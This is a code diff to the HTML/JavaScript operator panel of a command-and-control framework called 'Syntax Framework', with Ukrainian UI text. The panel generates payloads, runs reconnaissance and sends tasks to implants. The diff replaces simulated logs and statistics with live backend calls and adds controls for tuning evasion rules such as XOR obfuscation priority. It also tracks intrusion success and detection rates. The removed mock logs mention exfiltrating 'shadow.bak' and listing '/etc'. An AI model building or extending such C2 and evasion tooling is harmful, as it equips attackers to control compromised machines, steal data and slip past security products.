@@ -71,6 +71,9 @@
             padding: 0.75rem 1.5rem;
             border-radius: 0.375rem; 
             transition: background-color 0.15s ease-in-out;
+            display: inline-flex; /* Для спінера */
+            align-items: center; /* Для спінера */
+            justify-content: center; /* Для спінера */
         }
         button:hover {
             background-color: #4338CA; 
@@ -137,7 +140,7 @@
     <div class="bg-gray-800 p-6 sm:p-8 rounded-xl shadow-2xl w-full max-w-3xl border border-gray-700">
         <header class="mb-6 text-center">
             <h1 class="text-3xl sm:text-4xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-indigo-400 via-purple-500 to-pink-500">Syntax Framework</h1>
-            <p class="text-lg text-gray-400 mt-1">Контрольна Панель v2.8.GUI (Повний Backend)</p>
+            <p class="text-lg text-gray-400 mt-1">Контрольна Панель v2.8.GUI (Backend для C2)</p>
         </header>
 
         <div class="mb-6 border-b border-gray-700 flex overflow-x-auto">
@@ -331,27 +334,29 @@
                     <h3 class="text-lg font-semibold mb-3 text-gray-300">Агреговані Логи Операцій:</h3>
                     <div id="aggregatedLogsOutput" class="output-area h-64">
                         </div>
-                    <button id="refreshLogsButton" class="mt-3 bg-lime-600 hover:bg-lime-700 text-sm py-2 px-3">
-                        <span class="button-text">Оновити Логи (Імітація)</span>
+                    <button id="refreshLogsButtonLA" class="mt-3 bg-lime-600 hover:bg-lime-700 text-sm py-2 px-3"> <span class="button-text">Оновити Логи</span>
                         <span class="button-spinner hidden"><div class="spinner !w-3 !h-3 inline-block align-middle"></div></span>
                     </button>
                 </div>
                 <div>
                     <h3 class="text-lg font-semibold mb-3 text-gray-300">Статистика Ефективності (Імітація):</h3>
                     <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 p-4 bg-gray-700/50 rounded-lg border border-gray-600">
-                        <div><p class="text-gray-400">Успішних проникнень:</p><p id="statsSuccessRate" class="text-2xl font-bold text-green-400">75%</p></div>
-                        <div><p class="text-gray-400">Частота виявлення (середня):</p><p id="statsDetectionRate" class="text-2xl font-bold text-yellow-400">15%</p></div>
-                        <div><p class="text-gray-400">Найефективніший архетип:</p><p id="statsBestArchetype" class="text-xl font-semibold text-lime-300">demo_c2_beacon</p></div>
+                        <div><p class="text-gray-400">Успішних проникнень:</p><p id="statsSuccessRate" class="text-2xl font-bold text-green-400">--%</p></div>
+                        <div><p class="text-gray-400">Частота виявлення (середня):</p><p id="statsDetectionRate" class="text-2xl font-bold text-yellow-400">--%</p></div>
+                        <div><p class="text-gray-400">Найефективніший архетип:</p><p id="statsBestArchetype" class="text-xl font-semibold text-lime-300">N/A</p></div>
                          <div><p class="text-gray-400">Кількість активних імплантів:</p><p id="statsActiveImplants" class="text-2xl font-bold text-sky-400">0</p></div>
                     </div>
                 </div>
                 <div>
                     <h3 class="text-lg font-semibold mb-3 text-gray-300">Адаптація Правил Фреймворку (Концепт):</h3>
                     <div class="p-4 bg-gray-700/50 rounded-lg border border-gray-600 space-y-3">
-                        <p class="text-gray-400">Тут міг би бути інтерфейс для оновлення правил генерації пейлоадів...</p>
-                        <label class="checkbox-label text-gray-300"><input type="checkbox" id="autoAdaptRules" name="auto_adapt_rules" class="form-checkbox">Увімкнути автоматичну адаптацію правил (Імітація)</label>
+                        <label for="ruleToUpdate" class="text-gray-300">Правило для Оновлення (ID або назва):</label>
+                        <input type="text" id="ruleToUpdate" placeholder="напр. EVASION_TECHNIQUE_XOR_PRIORITY" class="bg-gray-600 border-gray-500 text-gray-200 placeholder-gray-400">
+                        <label for="newRuleValue" class="text-gray-300">Нове Значення/Параметр:</label>
+                        <input type="text" id="newRuleValue" placeholder="напр. 0.2 (знизити пріоритет)" class="bg-gray-600 border-gray-500 text-gray-200 placeholder-gray-400">
+                        <label class="checkbox-label text-gray-300"><input type="checkbox" id="autoAdaptRules" name="auto_adapt_rules" class="form-checkbox">Увімкнути автоматичну адаптацію на основі цих даних</label>
                         <button id="applyRuleChangesButton" class="bg-lime-600 hover:bg-lime-700">
-                            <span class="button-text">Застосувати Зміни Правил (Імітація)</span>
+                            <span class="button-text">Застосувати Зміни Правил</span>
                             <span class="button-spinner hidden"><div class="spinner inline-block align-middle"></div></span>
                         </button>
                     </div>
@@ -361,26 +366,24 @@
     </div>
 
 <script>
-    const API_BASE_URL = 'http://localhost:5000/api'; // Базова URL для backend
+    const API_BASE_URL = 'http://localhost:5000/api'; 
 
-    // --- Допоміжна функція для управління станом завантаження кнопки ---
     function setButtonLoadingState(button, isLoading, defaultText = "Надіслати") {
         const textSpan = button.querySelector('.button-text');
         const spinnerSpan = button.querySelector('.button-spinner');
         if (isLoading) {
             button.disabled = true;
-            if (textSpan) textSpan.classList.add('hidden');
-            if (spinnerSpan) spinnerSpan.classList.remove('hidden');
+            if (textSpan) textSpan.style.display = 'none'; 
+            if (spinnerSpan) spinnerSpan.style.display = 'inline-block'; 
         } else {
             button.disabled = false;
-            if (textSpan) textSpan.classList.remove('hidden');
-            if (spinnerSpan) spinnerSpan.classList.add('hidden');
+            if (textSpan) textSpan.style.display = 'inline'; 
+            if (spinnerSpan) spinnerSpan.style.display = 'none'; 
             if (textSpan && defaultText) textSpan.textContent = defaultText;
         }
     }
 
-
-    // --- Загальна логіка для табів (без змін) ---
+    // --- Загальна логіка для табів ---
     const tabButtons = document.querySelectorAll('.tab-button');
     const tabContents = document.querySelectorAll('.tab-content');
     tabButtons.forEach(button => {
@@ -390,18 +393,16 @@
             tabContents.forEach(content => content.classList.remove('active'));
             const activeTabContent = document.getElementById(button.dataset.tab);
             activeTabContent.classList.add('active');
+            
             if (button.dataset.tab === 'c2ControlTab') {
                 fetchAndRenderImplants(); 
             } else if (button.dataset.tab === 'loggingAdaptationTab') {
-                 if (aggregatedLogsOutput && !aggregatedLogsOutput.hasChildNodes()) { 
-                    generateSimulatedLogs();
-                    updateSimulatedStats();
-                 }
+                 fetchOperationalData(); 
             }
         });
     });
 
-    // --- Логіка для Генератора Пейлоадів ---
+    // --- Логіка для Генератора Пейлоадів (без змін від v2.7) ---
     const payloadForm = document.getElementById('payloadGeneratorForm');
     const payloadArchetypeSelect = document.getElementById('payloadArchetype');
     const payloadArchetypeParamsContainer = document.getElementById('archetypeParamsContainer');
@@ -422,7 +423,6 @@
         "c2_target_port": { requiredIf: "demo_c2_beacon_payload", isPort: true, idPrefix: "c2TargetPort" },
         "obfuscation_key": { required: true, minLength: 5, idPrefix: "obfuscationKey" }
     };
-
     if(payloadArchetypeSelect) {
         payloadArchetypeSelect.addEventListener('change', function() {
             const selectedArchetype = this.value;
@@ -475,12 +475,10 @@
         }
         return isValid;
     }
-    
     if(payloadForm) {
         payloadForm.addEventListener('submit', async function(event) { 
             event.preventDefault();
             setButtonLoadingState(generatePayloadButton, true, 'Згенерувати Пейлоад');
-            
             const formData = new FormData(payloadForm);
             const params = {};
             for (const [key, value] of formData.entries()) {
@@ -489,27 +487,19 @@
                 } else if (key === 'c2_target_port') {
                     params[key] = value ? parseInt(value, 10) : null; 
                 } 
-                else {
-                    params[key] = value;
-                }
+                else { params[key] = value; }
             }
-            
             if (!validatePayloadForm(formData)) { 
                 payloadGenerationLog.textContent = '[VALIDATOR_FAILURE] Будь ласка, виправте помилки у формі.';
                 payloadOutputSection.classList.add('hidden');
-                setButtonLoadingState(generatePayloadButton, false, 'Згенерувати Пейлоад');
-                return;
+                setButtonLoadingState(generatePayloadButton, false, 'Згенерувати Пейлоад'); return;
             }
-            
             payloadGenerationLog.textContent = `[GUI_INFO] Відправка запиту на ${API_BASE_URL}/generate_payload ...\n`;
             payloadStagerOutput.textContent = 'Очікування відповіді від backend...';
             payloadOutputSection.classList.remove('hidden');
-
             try {
                 const response = await fetch(`${API_BASE_URL}/generate_payload`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', },
-                    body: JSON.stringify(params),
+                    method: 'POST', headers: { 'Content-Type': 'application/json', }, body: JSON.stringify(params),
                 });
                 const responseData = await response.json();
                 payloadGenerationLog.textContent = responseData.generationLog || "Лог генерації не отримано.";
@@ -530,8 +520,7 @@
     }
     if (payloadArchetypeSelect) payloadArchetypeSelect.dispatchEvent(new Event('change'));
 
-
-    // --- Логіка для Модуля Розвідки ---
+    // --- Логіка для Модуля Розвідки (без змін від v2.7) ---
     const reconForm = document.getElementById('reconForm');
     const reconTargetInput = document.getElementById('reconTarget');
     const reconTypeSelect = document.getElementById('reconType');
@@ -563,8 +552,7 @@
             reconOutputSection.classList.remove('hidden');
             try {
                 const response = await fetch(`${API_BASE_URL}/run_recon`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', },
+                    method: 'POST', headers: { 'Content-Type': 'application/json', },
                     body: JSON.stringify({ target: target, recon_type: type }),
                 });
                 const responseData = await response.json();
@@ -639,7 +627,7 @@
     }
 
     function selectImplantGUI(implant) { 
-        currentSelectedImplant = implant; // Зберігаємо весь об'єкт імпланта
+        currentSelectedImplant = implant; 
         selectedImplantIdSpan.textContent = implant.id;
         selectedImplantSection.classList.remove('hidden');
         c2NoImplantSelectedDiv.classList.add('hidden');
@@ -689,7 +677,7 @@
     }
 
     if(c2TaskForm) {
-        c2TaskForm.addEventListener('submit', async function(event) { // Зроблено async
+        c2TaskForm.addEventListener('submit', async function(event) { 
             event.preventDefault();
             if (!currentSelectedImplant) { logToC2Output("[GUI_C2_ERROR] Не обрано жодного імпланта для надсилання завдання."); return; }
             setButtonLoadingState(sendTaskButton, true, 'Надіслати Завдання');
@@ -719,12 +707,11 @@
                 });
                 const responseData = await response.json();
 
-                if (responseData.log) logToC2Output(responseData.log.split('\\n').map(s => `[BE_LOG] ${s}`).join('\\n')); // Відображаємо лог з backend
+                if (responseData.log) logToC2Output(responseData.log.split('\\n').map(s => `[BE_LOG] ${s}`).join('\\n'));
 
                 if (response.ok && responseData.success) {
                     logToC2Output(`[GUI_C2_TASK_RESULT] ${responseData.result}`);
                     if (taskType === 'listdir' && responseData.updatedFiles) {
-                        // Оновлюємо список файлів для поточного імпланта в activeImplantsData
                         const implantInArray = activeImplantsData.find(imp => imp.id === currentSelectedImplant.id);
                         if (implantInArray) {
                             implantInArray.files = responseData.updatedFiles;
@@ -746,82 +733,117 @@
         refreshImplantsButton.addEventListener('click', fetchAndRenderImplants);
     }
     if(c2ControlTab) { 
-        fetchAndRenderImplants(); // Завантажуємо імпланти при першому завантаженні
+        fetchAndRenderImplants(); 
         updateC2TaskParamsGUI(); 
         if (c2ResultsOutput) c2ResultsOutput.textContent = "Очікування команд...\n";
     }
 
 
-    // --- Логіка для Вкладки Логування та Адаптації (без змін) ---
+    // --- Оновлена Логіка для Вкладки Логування та Адаптації ---
     const loggingAdaptationTab = document.getElementById('loggingAdaptationTab');
     const aggregatedLogsOutput = document.getElementById('aggregatedLogsOutput');
-    const refreshLogsButtonLA = document.getElementById('refreshLogsButton'); // Унікальний ID для кнопки
+    const refreshLogsButtonLA = document.getElementById('refreshLogsButtonLA'); 
     const statsSuccessRate = document.getElementById('statsSuccessRate');
     const statsDetectionRate = document.getElementById('statsDetectionRate');
     const statsBestArchetype = document.getElementById('statsBestArchetype');
     const statsActiveImplants = document.getElementById('statsActiveImplants'); 
     const autoAdaptRulesCheckbox = document.getElementById('autoAdaptRules');
     const applyRuleChangesButton = document.getElementById('applyRuleChangesButton');
-    function generateSimulatedLogs() {
-        if (!aggregatedLogsOutput) return;
-        aggregatedLogsOutput.innerHTML = ''; 
-        const logLevels = ["INFO", "WARN", "ERROR", "SUCCESS"];
-        const components = ["PayloadGen", "Recon", "C2_Implant_Alpha", "C2_Implant_Beta", "FrameworkCore", "AdaptationEngine"];
-        const messages = [
-            "Операцію запущено.", "Сканування порту 80 завершено.", "Виявлено вразливість CVE-2025-XXXX.",
-            "Пейлоад успішно доставлено.", "Помилка з'єднання з C2.", "Отримано нове завдання: 'listdir /etc'.",
-            "Ексфільтрація даних: 'shadow.bak' chunk 1/5.", "Виявлено підозрілу активність EDR на хості XYZ.",
-            "Правило метаморфізму #123 оновлено автоматично.", "Імплант перейшов у сплячий режим.",
-            "Невдала спроба підвищення привілеїв на HOST-ABC.", "Успішне виконання 'getsysinfo' на IMPLNT-123."
-        ];
-        for (let i = 0; i < 20; i++) { 
-            const level = logLevels[Math.floor(Math.random() * logLevels.length)];
-            const component = components[Math.floor(Math.random() * components.length)];
-            const message = messages[Math.floor(Math.random() * messages.length)];
-            const timestamp = new Date(Date.now() - Math.random() * 1000 * 60 * 30).toLocaleTimeString(); 
-            const logEntryDiv = document.createElement('div');
-            logEntryDiv.className = 'log-entry';
-            let logClass = 'log-info';
-            if (level === "WARN") logClass = 'log-warning';
-            else if (level === "ERROR") logClass = 'log-error';
-            else if (level === "SUCCESS") logClass = 'log-success';
-            logEntryDiv.innerHTML = `<span class="font-mono text-xs ${logClass}">[${timestamp}][${level}][${component}]</span> ${message}`;
-            aggregatedLogsOutput.appendChild(logEntryDiv);
+    const ruleToUpdateInput = document.getElementById('ruleToUpdate');
+    const newRuleValueInput = document.getElementById('newRuleValue');
+
+
+    async function fetchOperationalData() {
+        if (!aggregatedLogsOutput || !statsSuccessRate) return; 
+        setButtonLoadingState(refreshLogsButtonLA, true, 'Оновити Логи');
+        logToLoggingOutput("[GUI_LOG_ADAPT] Запит оперативних даних з backend...");
+        try {
+            const response = await fetch(`${API_BASE_URL}/operational_data`);
+            const data = await response.json();
+
+            if (data.log) logToLoggingOutput(data.log.split('\\n').map(s => `[BE_LOG] ${s}`).join('\\n'));
+            
+            if (data.success) {
+                aggregatedLogsOutput.innerHTML = ''; 
+                if (data.aggregatedLogs && data.aggregatedLogs.length > 0) {
+                    data.aggregatedLogs.forEach(log => {
+                        const logEntryDiv = document.createElement('div');
+                        logEntryDiv.className = 'log-entry';
+                        let logClass = 'log-info';
+                        if (log.level === "WARN") logClass = 'log-warning';
+                        else if (log.level === "ERROR") logClass = 'log-error';
+                        else if (log.level === "SUCCESS") logClass = 'log-success';
+                        logEntryDiv.innerHTML = `<span class="font-mono text-xs ${logClass}">[${log.timestamp}][${log.level}][${log.component}]</span> ${log.message}`;
+                        aggregatedLogsOutput.appendChild(logEntryDiv);
+                    });
+                    aggregatedLogsOutput.scrollTop = aggregatedLogsOutput.scrollHeight;
+                } else {
+                    aggregatedLogsOutput.innerHTML = '<p class="text-gray-400">Агрегованих логів не знайдено.</p>';
+                }
+
+                if (data.statistics) {
+                    statsSuccessRate.textContent = `${data.statistics.successRate || '--'}%`;
+                    statsDetectionRate.textContent = `${data.statistics.detectionRate || '--'}%`;
+                    statsBestArchetype.textContent = data.statistics.bestArchetype || 'N/A';
+                    statsActiveImplants.textContent = data.statistics.activeImplants !== undefined ? data.statistics.activeImplants.toString() : '0';
+                }
+                logToLoggingOutput("[GUI_LOG_ADAPT] Оперативні дані оновлено з backend.");
+            } else {
+                logToLoggingOutput(`[GUI_LOG_ADAPT_ERROR] Помилка отримання оперативних даних: ${data.error || 'Невідома помилка backend'}`);
+                 aggregatedLogsOutput.innerHTML = '<p class="text-red-400">Не вдалося завантажити логи.</p>';
+                 statsSuccessRate.textContent = '--%';
+                 statsDetectionRate.textContent = '--%';
+                 statsBestArchetype.textContent = 'N/A';
+                 statsActiveImplants.textContent = '0';
+            }
+        } catch (error) {
+            logToLoggingOutput(`[GUI_LOG_ADAPT_ERROR] Помилка мережевого запиту для оперативних даних: ${error.message}`);
+            aggregatedLogsOutput.innerHTML = '<p class="text-red-400">Помилка зв\'язку з backend для логів.</p>';
+        } finally {
+            setButtonLoadingState(refreshLogsButtonLA, false, 'Оновити Логи');
         }
-        aggregatedLogsOutput.scrollTop = aggregatedLogsOutput.scrollHeight;
     }
-    function updateSimulatedStats() {
-        if (statsSuccessRate) statsSuccessRate.textContent = `${(60 + Math.random() * 30).toFixed(0)}%`;
-        if (statsDetectionRate) statsDetectionRate.textContent = `${(5 + Math.random() * 20).toFixed(0)}%`;
-        if (statsBestArchetype) {
-            const archetypes = ["demo_c2_beacon_payload", "demo_echo_payload", "custom_https_stager", "dns_exfiltrator"];
-            statsBestArchetype.textContent = archetypes[Math.floor(Math.random() * archetypes.length)];
-        }
-        if (statsActiveImplants) statsActiveImplants.textContent = activeImplantsData.length.toString(); 
+    
+    if (refreshLogsButtonLA) {
+        refreshLogsButtonLA.addEventListener('click', fetchOperationalData);
     }
-    if (refreshLogsButtonLA) { // Використовуємо унікальний ID
-        refreshLogsButtonLA.addEventListener('click', () => {
-            setButtonLoadingState(refreshLogsButtonLA, true, 'Оновити Логи (Імітація)');
-            logToLoggingOutput("Імітація оновлення логів...");
-            setTimeout(() => { // Імітація затримки
-                generateSimulatedLogs();
-                updateSimulatedStats();
-                logToLoggingOutput("Логи та статистика оновлені (імітація).");
-                setButtonLoadingState(refreshLogsButtonLA, false, 'Оновити Логи (Імітація)');
-            }, 500);
-        });
-    }
+
     if (applyRuleChangesButton) {
-        applyRuleChangesButton.addEventListener('click', () => {
-            setButtonLoadingState(applyRuleChangesButton, true, 'Застосувати Зміни Правил (Імітація)');
+        applyRuleChangesButton.addEventListener('click', async () => { 
+            setButtonLoadingState(applyRuleChangesButton, true, 'Застосувати Зміни Правил');
             const autoAdapt = autoAdaptRulesCheckbox.checked;
-            logToLoggingOutput(`Імітація застосування змін правил... (Автоматична адаптація: ${autoAdapt})`);
-            setTimeout(() => {
-                 logToLoggingOutput("Правила (начебто) оновлено. Наприклад, пріоритет техніки 'XOR String Obfuscation' знижено через часте виявлення.");
-                 setButtonLoadingState(applyRuleChangesButton, false, 'Застосувати Зміни Правил (Імітація)');
-            }, 800);
+            const ruleId = ruleToUpdateInput.value || "DEFAULT_RULE_ID";
+            const newValue = newRuleValueInput.value || "DEFAULT_NEW_VALUE";
+
+            logToLoggingOutput(`[GUI_LOG_ADAPT] Надсилання запиту на оновлення правила '${ruleId}' на значення '${newValue}'. Авто-адаптація: ${autoAdapt}`);
+            
+            try {
+                const response = await fetch(`${API_BASE_URL}/framework_rules`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', },
+                    body: JSON.stringify({ 
+                        auto_adapt_rules: autoAdapt,
+                        rule_id: ruleId,
+                        new_value: newValue
+                    }),
+                });
+                const responseData = await response.json();
+
+                if (responseData.log) logToLoggingOutput(responseData.log.split('\\n').map(s => `[BE_LOG] ${s}`).join('\\n'));
+
+                if (response.ok && responseData.success) {
+                    logToLoggingOutput(`[GUI_LOG_ADAPT_SUCCESS] ${responseData.message}`);
+                } else {
+                    logToLoggingOutput(`[GUI_LOG_ADAPT_ERROR] Помилка оновлення правил: ${responseData.error || 'Невідома помилка backend'}`);
+                }
+            } catch (error) {
+                logToLoggingOutput(`[GUI_LOG_ADAPT_ERROR] Помилка мережевого запиту для оновлення правил: ${error.message}`);
+            } finally {
+                 setButtonLoadingState(applyRuleChangesButton, false, 'Застосувати Зміни Правил');
+            }
         });
     }
+    
     function logToLoggingOutput(message) { 
         if (!aggregatedLogsOutput) return; 
         const timestamp = new Date().toLocaleTimeString();
@@ -834,24 +856,24 @@
             aggregatedLogsOutput.appendChild(logEntryDiv);
         }
     }
+    
     const loggingTabObserver = new MutationObserver((mutationsList, observer) => {
         for(const mutation of mutationsList) {
             if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
                 if (loggingAdaptationTab && loggingAdaptationTab.classList.contains('active')) {
-                    if (aggregatedLogsOutput && !aggregatedLogsOutput.hasChildNodes()) { 
-                        generateSimulatedLogs();
-                        updateSimulatedStats();
-                    }
+                    fetchOperationalData();
                 }
             }
         }
     });
     if (loggingAdaptationTab) { 
          loggingTabObserver.observe(loggingAdaptationTab, { attributes: true });
-         if (loggingAdaptationTab.classList.contains('active') && aggregatedLogsOutput && !aggregatedLogsOutput.hasChildNodes()) {
-            generateSimulatedLogs();
-            updateSimulatedStats();
+         if (loggingAdaptationTab.classList.contains('active')) { 
+            fetchOperationalData();
          }
+    }
+    if (c2ControlTab && c2ControlTab.classList.contains('active')) {
+        fetchAndRenderImplants();
     }
 
 </script>
